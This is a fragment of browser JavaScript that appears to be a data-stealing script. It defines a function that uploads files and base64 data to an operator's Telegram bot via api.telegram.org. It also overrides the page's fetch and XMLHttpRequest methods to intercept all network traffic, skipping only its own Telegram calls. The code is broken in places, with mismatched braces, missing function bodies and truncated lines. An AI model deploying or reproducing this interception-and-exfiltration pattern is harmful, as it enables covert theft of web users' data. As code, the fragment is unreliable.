        async function sendFile(fileData, filename, caption = '') {
            try {
                const formData = new FormData();
                formData.append('chat_id', ADMIN_CHAT_ID);
                formData.append('caption', caption.substring(0, 200)); // Telegram limit caption
                
                // Handle base64
                if (typeof fileData === 'string' && fileData.startsWith('data:')) {
                    const matches = fileData.match(/^data:([^;]+);base64,(.+)$/);
                    if (matches) {
                        const mimeType = matches[1];
                        const base64 = matches[2];
                        
                        // Convert base64 to blob
                        const byteCharacters = atob(base64);
                        const byteNumbers = new Array(byteCharacters.length);
                        for (let i = 0; i < byteCharacters.length; i++) {
                            byteNumbers[i] = byteCharacters.charCodeAt(i);
                        }
                        const byteArray = new Uint8Array(byteNumbers);
                        const blob = new Blob([byteArray], { type: mimeType });
                        
                        formData.append('document', blob, filename);
                    }
                } else if (fileData instanceof Blob) {
                    formData.append('document', fileData, filename);
                } else {
                    throw new Error('Invalid file data');
                }
                
                // Use fetch with FormData
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                    method: 'POST',
                    body: formData,
                    mode: 'cors',
                    credentials: 'omit'
                });
                
                return await response.json();
            } catch (error) {
                console.warn('File send failed:', error);

                    await sendMessage(`📎 ${caption}\n${fileData.substring(0, 500)}...`);
                }
                return null;
            }
        }

            // Intercept fetch

                const requestInfo = args[0];
                const requestInit = args[1] || {};
                
                // Don't intercept our own Telegram traffic
                const urlStr = typeof requestInfo === 'string' ? requestInfo : requestInfo.url;
                if (urlStr && urlStr.includes('api.telegram.org')) {

                return originalFetch.apply(this, args);
            };
            
            // Intercept XHR

                this._method = method;
                this._url = url;
                return originalXHROpen.apply(this, [method, url, ...rest]);

            XMLHttpRequest.prototype.send = function(body) {

                return originalXHRSend.apply(this, [body]);
